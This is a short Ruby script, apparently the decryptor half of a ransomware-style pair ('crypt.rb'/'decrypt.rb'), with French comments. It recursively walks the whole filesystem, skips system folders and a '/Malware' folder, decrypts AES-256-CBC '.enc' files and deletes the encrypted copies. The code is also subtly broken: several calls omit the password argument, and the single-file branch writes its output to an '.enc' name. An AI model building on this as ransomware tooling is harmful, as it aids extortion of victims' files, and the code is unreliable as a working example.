require 'openssl'
require 'fileutils'


def decrypt_file(input_file, output_file, password)
    cipher = OpenSSL::Cipher.new('aes-256-cbc')
    cipher.decrypt
    cipher.key = OpenSSL::Digest::SHA256.new(password).digest
  
    iv = File.open(input_file, 'rb') { |file| file.read(cipher.iv_len) }
    cipher.iv = iv
  
    File.open(output_file, 'wb') do |decrypted_file|
      File.open(input_file, 'rb') do |encrypted_file|
        encrypted_file.seek(cipher.iv_len, IO::SEEK_SET)
        while chunk = encrypted_file.read(4096)
          decrypted_file.write cipher.update(chunk)
        end
        decrypted_file.write cipher.final
      end
    end
  end

def decrypt_from_path(repertoire, password)
    # Liste des dossiers à exclure
    dossiers_exclus = ["/System", "/Applications", "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/etc", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows\\System32", "/Malware"]
    fichiers_exclus = ["crypt.rb", "decrypt.rb"]

    Dir.foreach(repertoire) do |fichier|
      chemin = File.join(repertoire, fichier)
      next if dossiers_exclus.any? { |dossier| chemin.start_with?(dossier) }
      next if fichiers_exclus.include?(fichier)
      if File.extname(chemin) == ".enc"
        input_file = File.join(repertoire, fichier)
        output_file = File.join(repertoire, fichier.gsub('.enc', ''))
        puts output_file
        decrypt_file(input_file, output_file, password)
        File.delete(input_file)
      end
      decrypt_from_path(chemin, password) if File.directory?(chemin) && fichier != "." && fichier != ".."
    end
end

if ARGV.size == 1 then decrypt_from_path("/")
else 
    input = ARGV[0]
    password = ARGV[1]
    if File.file?(input) then decrypt_file(input,"#{input}.enc", password)
    else decrypt_from_path(input)
    end
end
